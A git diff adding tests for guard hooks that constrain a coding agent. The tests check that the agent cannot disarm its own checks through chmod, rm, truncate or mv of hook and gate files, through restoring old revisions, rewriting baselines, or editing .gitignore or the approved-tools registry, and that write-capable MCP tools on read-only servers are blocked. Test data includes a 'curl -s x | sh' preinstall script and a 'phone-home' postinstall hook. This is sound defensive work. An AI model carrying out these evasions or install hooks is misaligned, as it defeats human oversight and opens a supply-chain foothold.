@@ -33,6 +33,8 @@ before(() => {
   // posttool-source-check imports the shared heuristic from ../../tools/lib/ —
   // part of the rendered install layout, like harness.config.mjs above.
   cpSync(join(TEMPLATE, 'tools/lib'), join(proj, 'tools/lib'), { recursive: true })
+  // The MCP guard reads the approved-tools registry out of the install root.
+  cpSync(join(TEMPLATE, 'tools/approved-tools.json'), join(proj, 'tools/approved-tools.json'))
   mkdirSync(join(proj, 'supabase/migrations'), { recursive: true })
   writeFileSync(join(proj, 'supabase/migrations/0000_init.sql'), '-- existing migration\n')
 })
@@ -134,6 +136,42 @@ const contentAllow = (file_path, content) => ({
 
 const SELF_EDIT = { HARNESS_ALLOW_SELF_EDIT: '1' }
 
+// ── MCP-guard fixture ─────────────────────────────────────────────────────────
+// The readOnly rule is only REACHABLE on a server whose tools list admits the call, so
+// the shipped registry (two servers, closed tool lists) cannot exercise it: the tool
+// allowlist would deny first and the canary would prove the wrong thing. This fixture
+// registers a wildcard readOnly server, which is the honest spelling for a large
+// first-party server and exactly the configuration where shape-based denial is the only
+// thing standing between a read grant and `apply_migration`.
+const MCP_FIXTURE = mkdtempSync(join(tmpdir(), 'epah-mcp-'))
+mkdirSync(join(MCP_FIXTURE, 'tools'), { recursive: true })
+writeFileSync(
+  join(MCP_FIXTURE, 'tools/approved-tools.json'),
+  `${JSON.stringify(
+    {
+      servers: [
+        { server: 'wide', version: 'x', readOnly: true, reason: 'fixture', tools: ['*'] },
+        { server: 'writable', version: 'x', readOnly: false, reason: 'fixture', tools: ['*'] },
+      ],
+    },
+    null,
+    2,
+  )}\n`,
+)
+const MCP_ENV = { CLAUDE_PROJECT_DIR: MCP_FIXTURE }
+const mcpDeny = (tool_name, env = MCP_ENV) => ({
+  hook: 'pretool-mcp-guard.mjs',
+  input: { tool_name, tool_input: {} },
+  expectDeny: true,
+  env,
+})
+const mcpAllow = (tool_name, env = MCP_ENV) => ({
+  hook: 'pretool-mcp-guard.mjs',
+  input: { tool_name, tool_input: {} },
+  expectDeny: false,
+  env,
+})
+
 const RULE_CANARIES = {
   // ── bash-guard ──
   'rm-rf': [
@@ -216,6 +254,68 @@ const RULE_CANARIES = {
     bashAllow('node tools/gen-agents-lock.mjs --check'),
     bashAllow('node tools/gen-agents-lock.mjs'),
     bashAllow('node tools/gen-agents-lock.mjs --write', SELF_EDIT),
+  ],
+  // ── the DISARM verbs (0.3.0): neutralize the surface without writing to it ──
+  // Every one of these was ALLOWED before 0.3.0, and not one of them lands a byte on the
+  // path it targets, which is exactly why the redirect/tee/sed/cp/interpreter rules all
+  // missed them.
+  'chmod-protected': [
+    // THE governing-proof case: `chmod -x` on the Stop hook used to silently disarm the
+    // turn gate while every sha256 in the manifest still matched.
+    bashDeny('chmod -x .claude/hooks/stop-validate-gate.mjs'),
+    bashDeny('chmod 000 tools/validate.mjs'),
+    bashDeny('chmod -R a-x .claude/hooks'),
+    bashAllow('chmod +x scripts/deploy.sh'),
+    bashAllow('chmod -x .claude/hooks/stop-validate-gate.mjs', SELF_EDIT),
+  ],
+  'rm-protected': [
+    bashDeny('rm tools/check-tenancy.mjs'),
+    bashDeny('rm .harness/manifest.json'),
+    bashDeny('rm .github/workflows/quality-gate.yml'),
+    bashDeny('rm -f tools/rls-exempt.json'),
+    // Ordinary cleanup is untouched (and `rm -rf` has its own, earlier rule).
+    bashAllow('rm stale.log'),
+    bashAllow('rm -f build/out.js'),
+    bashAllow('rm tools/check-tenancy.mjs', SELF_EDIT),
+  ],
+  'truncate-protected': [
+    bashDeny('truncate -s 0 tools/rls-exempt.json'),
+    bashDeny('truncate --size 0 .claude/hooks/pretool-write-guard.mjs'),
+    bashAllow('truncate -s 0 logs/app.log'),
+    bashAllow('truncate -s 0 tools/rls-exempt.json', SELF_EDIT),
+  ],
+  'move-protected-away': [
+    bashDeny('mv tools/check-migrations.mjs /tmp/parked.mjs'),
+    bashDeny('mv .claude/hooks/stop-validate-gate.mjs .claude/hooks/stop-validate-gate.mjs.bak'),
+    // Reading FROM the surface stays allowed — only relocation removes the file.
+    bashAllow('cp tools/check-migrations.mjs /tmp/inspect.mjs'),
+    bashAllow('mv draft.md docs/notes.md'),
+    bashAllow('mv tools/check-migrations.mjs /tmp/parked.mjs', SELF_EDIT),
+  ],
+  'git-restore-old-revision': [
+    bashDeny('git checkout HEAD~5 -- tools/check-rls-manifest.mjs'),
+    bashDeny('git checkout v0.1.0 -- tools/validate.floor.json'),
+    bashDeny('git restore --source=HEAD~3 tools/harness.config.mjs'),
+    bashDeny('git restore -s v0.1.0 .claude/hooks/pretool-write-guard.mjs'),
+    // The REMEDY a dozen gate messages prescribe — restoring the CURRENT committed
+    // content — must stay allowed, or the guard teaches people to reach for the escape.
+    bashAllow('git checkout -- tools/check-rls-manifest.mjs'),
+    bashAllow('git restore tools/harness.config.mjs'),
+    bashAllow('git checkout HEAD~5 -- src/app.ts'),
+    bashAllow('git checkout HEAD~5 -- tools/check-rls-manifest.mjs', SELF_EDIT),
+  ],
+  'self-rebaseline-writer': [
+    // The sibling of gen-lock-writer: not a write to the surface, just one subprocess
+    // that turns the regression the ratchet caught into the new normal.
+    bashDeny('node tools/check-mutation-ratchet.mjs --write'),
+    bashDeny('node tools/perf-baseline.mjs'),
+    bashDeny('pnpm perf:baseline'),
+    // READING the ratchet's verdict is the whole point of the ratchet.
+    bashAllow('node tools/check-mutation-ratchet.mjs'),
+    // `pnpm gen`'s inventory generators are regen-DIFFED by the contracts gate, so
+    // re-running one is checked, not accepted.
+    bashAllow('node tools/gen-action-inventory.mjs'),
+    bashAllow('node tools/check-mutation-ratchet.mjs --write', SELF_EDIT),
   ],
   'git-hookspath-repoint': [
     bashDeny('git config core.hooksPath /tmp/nohooks'),
@@ -394,6 +494,115 @@ const RULE_CANARIES = {
     pathDeny('apps/mobile/android/gradle.properties'),
   ],
   'cng-ios': [pathDeny('apps/mobile/ios/Podfile'), pathDeny('apps/mobile/ios/App/Info.plist')],
+
+  // ── write-guard: the 0.3.0 closure over the high-leverage unprotected files ──
+  // Every path below was agent-writable on 0.2.1. Each carries its deny plus an ALLOW
+  // TWIN: a rule that denies a whole directory an agent legitimately works in is a rule
+  // that gets escaped, so the twin is where the scope is actually pinned down.
+  'codeowners': [
+    // The compensating control ~ten gate failure messages cite by name.
+    pathDeny('.github/CODEOWNERS'),
+    pathAllow('docs/CODEOWNERS-guide.md'),
+    pathAllow('.github/CODEOWNERS', SELF_EDIT),
+  ],
+  'actionlint-config': [pathDeny('.github/actionlint.yaml'), pathAllow('.github/dependabot.yml')],
+  'zizmor-config': [pathDeny('.github/zizmor.yml'), pathAllow('.github/ISSUE_TEMPLATE/bug.yml')],
+  'pr-template': [
+    pathDeny('.github/pull_request_template.md'),
+    pathAllow('.github/ISSUE_TEMPLATE/feature.md'),
+  ],
+  'gitignore': [
+    // One appended line here makes a file invisible to `git status`, which is what the
+    // escape-list dirty check, the diff-coverage change set and the append-only
+    // migration diff all read.
+    pathDeny('.gitignore'),
+    pathAllow('apps/mobile/.gitignore-notes.md'),
+    pathAllow('.gitignore', SELF_EDIT),
+  ],
+  'renovate-config': [pathDeny('renovate.json'), pathAllow('docs/renovate-policy.md')],
+  'stryker-config': [pathDeny('stryker.config.mjs'), pathAllow('apps/web/next.config.ts')],
+  'commitlint-config': [pathDeny('commitlint.config.mjs'), pathAllow('apps/web/postcss.config.mjs')],
+  'tools-ci': [
+    pathDeny('tools/ci/device-lane.sh'),
+    pathDeny('tools/ci/perf-lane.sh'),
+    pathAllow('scripts/local-smoke.sh'),
+  ],
+  'claude-hooks': [
+    // Layer 1 (the settings.json deny list) already covered these; layer 2 did not — and
+    // a deny list is only as good as the settings file it lives in.
+    pathDeny('.claude/hooks/pretool-write-guard.mjs'),
+    pathDeny('.claude/hooks/lib/guard-rules.mjs'),
+    pathAllow('.claude/agents/security-reviewer.md', SELF_EDIT),
+    pathAllow('.claude/hooks/pretool-write-guard.mjs', SELF_EDIT),
+  ],
+  'claude-statusline': [pathDeny('.claude/statusline.mjs'), pathAllow('apps/web/lib/status.ts')],
+  'approved-tools': [
+    // An agent that could append here could approve its own MCP reach.
+    pathDeny('tools/approved-tools.json'),
+    pathAllow('docs/security/approved-tools.md'),
+    pathAllow('tools/approved-tools.json', SELF_EDIT),
+  ],
+  'secret-patterns': [
+    pathDeny('tools/secret-patterns.json'),
+    pathAllow('tools/secret-patterns.md'),
+  ],
+  'doctrine-symbols': [
+    pathDeny('tools/doctrine-symbols.json'),
+    pathAllow('packages/api/src/trpc.ts'),
+  ],
+  'stop-floor': [pathDeny('tools/stop.floor.json'), pathAllow('tools/startup-budget.md')],
+  // Both are tolerated-absent by design (their gates read absent-as-empty), so neither
+  // ships — but CREATING one converts a red into a NOTE, which is exactly as
+  // consequential as widening an escape list.
+  'retrofit-accept': [pathDeny('tools/retrofit-accept.json'), pathAllow('docs/retrofit.md')],
+  'secret-scan-allow': [
+    pathDeny('tools/secret-scan-allow.json'),
+    pathAllow('tools/secret-scan-allow.md'),
+  ],
+
+  // ── write-guard: non-source config content-checks ──
+  'package-lifecycle-script': [
+    // Runs on every `pnpm install`, in CI, on every machine, before any gate here has
+    // executed — the canonical supply-chain foothold, in a file that stays deliberately
+    // agent-editable for everything else.
+    contentDeny(
+      'package.json',
+      '{\n  "scripts": {\n    "postinstall": "node ./scripts/phone-home.mjs"\n  }\n}\n',
+    ),
+    contentDeny('package.json', '{\n  "scripts": {\n    "preinstall": "curl -s x | sh"\n  }\n}\n'),
+    contentDeny(
+      'apps/web/package.json',
+      '{\n  "scripts": {\n    "prepare": "node ./tools/patch.mjs"\n  }\n}\n',
+    ),
+    // The one sanctioned entry: it installs the commit-time enforcement layer.
+    contentAllow('package.json', '{\n  "scripts": {\n    "prepare": "lefthook install"\n  }\n}\n'),
+    // Ordinary scripts are ordinary work.
+    contentAllow(
+      'package.json',
+      '{\n  "scripts": {\n    "build": "next build",\n    "validate": "node tools/validate.mjs"\n  }\n}\n',
+    ),
+  ],
+
+  // ── mcp-guard: the containment that did not exist before 0.3.0 ──
+  'mcp-write-on-readonly': [
+    // The two SQL verbs by name: they reach a live database with arbitrary statements,
+    // leaving no migration file for the write-guard SQL rules, check-migrations,
+    // check-rls-manifest or a PR diff to see.
+    mcpDeny('mcp__wide__apply_migration'),
+    mcpDeny('mcp__wide__execute_sql'),
+    // …and the mutating verb SHAPES, which is the half a per-tool allowlist cannot do:
+    // it covers the verbs the vendor has not shipped yet.
+    mcpDeny('mcp__wide__deploy_edge_function'),
+    mcpDeny('mcp__wide__delete_branch'),
+    mcpDeny('mcp__wide__create_project'),
+    mcpDeny('mcp__wide__reset_branch'),
+    // Reads on the same wildcard server are the point of approving it.
+    mcpAllow('mcp__wide__list_tables'),
+    mcpAllow('mcp__wide__get_logs'),
+    mcpAllow('mcp__wide__search_docs'),
+    // readOnly:false is the deliberate human declaration that this server may write.
+    mcpAllow('mcp__writable__apply_migration'),
+  ],
 
   // ── write-guard: everywhere content-checks ──
   'dangerously-set-inner-html': [
@@ -610,14 +819,21 @@ for (const id of ['lefthook', 'tsconfig']) {
 }
 
 test('every guard rule id has a behavioral canary (per-rule falsifiability closure)', async () => {
-  const { BASH_RULES, WRITE_PROTECTED, WRITE_GLOBAL_CHECKS, WRITE_SQL_CHECKS } = await import(
-    GUARD_RULES.href
-  )
+  const {
+    BASH_RULES,
+    WRITE_PROTECTED,
+    WRITE_GLOBAL_CHECKS,
+    WRITE_SQL_CHECKS,
+    WRITE_CONFIG_CHECKS,
+    MCP_RULES,
+  } = await import(GUARD_RULES.href)
   const ids = [
     ...BASH_RULES,
     ...WRITE_PROTECTED,
     ...WRITE_GLOBAL_CHECKS,
     ...WRITE_SQL_CHECKS,
+    ...WRITE_CONFIG_CHECKS,
+    ...MCP_RULES,
   ].map((r) => r.id)
   for (const id of ids) {
     assert.ok(
@@ -630,6 +846,110 @@ test('every guard rule id has a behavioral canary (per-rule falsifiability closu
   for (const key of Object.keys(RULE_CANARIES)) {
     assert.ok(idSet.has(key), `RULE_CANARIES has '${key}' but no guard rule exports that id`)
   }
+})
+
+// ── mcp-guard: the inline denies (no flat rule id, so no RULE_CANARIES entry) ──
+// Before 0.3.0 an `mcp__` tool call matched NO PreToolUse hook — the matchers were
+// literally "Bash" and "Edit|Write|MultiEdit" — while docs/security/approved-tools.md
+// declared default-deny. Every case below is a call that used to reach the database, the
+// filesystem or the network with nothing in its path.
+const mcp = (tool_name, env) =>
+  runHook('pretool-mcp-guard.mjs', { tool_name, tool_input: {} }, { env: env ?? MCP_ENV })
+
+test('mcp-guard: an unregistered server is DENIED, with the exact one-edit remedy', () => {
+  const r = mcp('mcp__supabase__list_tables')
+  assert.ok(denied(r), r.stdout)
+  // Risk stated in the release plan: a deny message that leaves the user guessing teaches
+  // HARNESS_ALLOW_SELF_EDIT habits, which is the worst thing a guard can teach. The
+  // remedy must arrive with the call's own values already filled in — asserted on the
+  // DECODED reason, since the wire form is a JSON string with everything escaped.
+  const reason = JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason
+  assert.match(reason, /not in the approved registry/)
+  assert.match(reason, /"server": "supabase"/)
+  assert.match(reason, /"tools": \["list_tables"\]/)
+  assert.match(reason, /docs\/security\/approved-tools\.md/)
+})
+
+test('mcp-guard: a registered server does not admit a tool outside its list', () => {
+  // The shipped registry: corpus_search is approved for two read tools and nothing else.
+  const ok = runHook('pretool-mcp-guard.mjs', {
+    tool_name: 'mcp__corpus_search__corpus_search',
+    tool_input: {},
+  })
+  assert.ok(!denied(ok), ok.stdout)
+  const no = runHook('pretool-mcp-guard.mjs', {
+    tool_name: 'mcp__corpus_search__execute_sql',
+    tool_input: {},
+  })
+  assert.ok(denied(no), no.stdout)
+  assert.match(no.stdout, /is not on its list/)
+})
+
+test('mcp-guard FAILS CLOSED with no registry — an absent policy is not an empty policy', () => {
+  const bare = mkdtempSync(join(tmpdir(), 'epah-mcp-bare-'))
+  const r = mcp('mcp__corpus_search__corpus_search', { CLAUDE_PROJECT_DIR: bare })
+  assert.ok(denied(r), r.stdout)
+  assert.match(r.stdout, /is missing/)
+})
+
+test('mcp-guard FAILS CLOSED on a corrupt or mis-shaped registry (tampering, not config)', () => {
+  const corrupt = mkdtempSync(join(tmpdir(), 'epah-mcp-corrupt-'))
+  mkdirSync(join(corrupt, 'tools'), { recursive: true })
+  writeFileSync(join(corrupt, 'tools/approved-tools.json'), '{ not json')
+  const bad = mcp('mcp__corpus_search__corpus_search', { CLAUDE_PROJECT_DIR: corrupt })
+  assert.ok(denied(bad), bad.stdout)
+  assert.match(bad.stdout, /not valid JSON/)
+
+  const shapeless = mkdtempSync(join(tmpdir(), 'epah-mcp-shape-'))
+  mkdirSync(join(shapeless, 'tools'), { recursive: true })
+  writeFileSync(join(shapeless, 'tools/approved-tools.json'), '{"servers": "all of them"}')
+  const r = mcp('mcp__corpus_search__corpus_search', { CLAUDE_PROJECT_DIR: shapeless })
+  assert.ok(denied(r), r.stdout)
+  assert.match(r.stdout, /no `servers` array/)
+})
+
+test('mcp-guard: a registered server with an EMPTY tools list approves nothing', () => {
+  const empty = mkdtempSync(join(tmpdir(), 'epah-mcp-empty-'))
+  mkdirSync(join(empty, 'tools'), { recursive: true })
+  writeFileSync(
+    join(empty, 'tools/approved-tools.json'),
+    JSON.stringify({ servers: [{ server: 'half', readOnly: true, tools: [] }] }),
+  )
+  const r = mcp('mcp__half__anything', { CLAUDE_PROJECT_DIR: empty })
+  assert.ok(denied(r), r.stdout)
+  assert.match(r.stdout, /lists no tools/)
+})
+
+test('mcp-guard: an unparseable tool name is DENIED (a containment that guesses is none)', () => {
+  for (const name of ['mcp__', 'mcp__lonely', 'mcp____tool', 'mcp__server__']) {
+    const r = mcp(name)
+    assert.ok(denied(r), `${name} → ${r.stdout}`)
+  }
+  // A tool whose own name contains `__` must bind to the FIRST separator, not reparse
+  // into a different server.
+  const nested = mcp('mcp__wide__get__thing')
+  assert.ok(!denied(nested), nested.stdout)
+})
+
+test('mcp-guard passes through a non-MCP tool name (it never trusts its own matcher)', () => {
+  const r = mcp('Bash')
+  assert.equal(r.code, 0)
+  assert.ok(!denied(r), r.stdout)
+})
+
+test('mcp-guard fails CLOSED on malformed stdin and on unloadable rules', () => {
+  const bad = runHook('pretool-mcp-guard.mjs', 'this is { not json')
+  assert.equal(bad.code, 2, bad.stderr)
+
+  const broken = mkdtempSync(join(tmpdir(), 'epah-mcp-norules-'))
+  cpSync(join(TEMPLATE, '.claude'), join(broken, '.claude'), { recursive: true })
+  rmSync(join(broken, '.claude/hooks/lib/guard-rules.mjs'))
+  const res = spawnSync('node', [join(broken, '.claude/hooks/pretool-mcp-guard.mjs')], {
+    input: JSON.stringify({ tool_name: 'mcp__wide__list_tables', tool_input: {} }),
+    encoding: 'utf8',
+    env: { ...process.env, CLAUDE_PROJECT_DIR: broken },
+  })
+  assert.equal(res.status, 2, 'a guard that cannot read its rules approves nothing')
 })
 
 // ── write-guard: allow / no-false-positive contract ───────────────────────────
